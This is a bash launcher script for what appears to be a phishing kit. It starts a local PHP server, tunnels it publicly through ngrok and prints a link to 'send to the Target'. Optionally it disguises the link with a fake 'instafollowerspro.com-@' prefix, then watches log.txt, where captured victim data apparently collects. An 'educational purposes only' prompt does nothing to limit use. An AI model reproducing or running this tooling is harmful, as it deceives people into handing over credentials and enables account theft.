#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m NGROK SERVER :\e[1;32m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK !\e[0m"
sleep 4
clear
echo ""
echo ""
read -p $'\e[1;40m\e[96m E D U C A T I O N A l  P U R P O S E S  O N L Y ? \e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
bash Logo.sh
echo ""

echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""

                         read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.instafollowerspro.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 
                    

                break;